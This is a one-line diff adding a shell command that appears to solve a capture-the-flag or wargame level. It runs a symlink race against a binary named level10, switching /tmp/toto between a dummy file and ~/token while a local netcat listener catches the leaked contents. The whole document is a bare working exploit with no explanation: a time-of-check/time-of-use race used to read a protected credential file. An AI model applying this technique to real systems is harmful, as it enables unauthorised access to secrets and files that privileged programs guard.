@@ -1,0 +1,1 @@
+echo '.*( )*.' > /tmp/swap ; nc -l 6969 | tr -d '.*( )*.' & ~/level10 /tmp/toto 127.0.0.1 &> /dev/null & ln -fs /tmp/swap /tmp/toto ; ln -fs ~/token /tmp/toto;
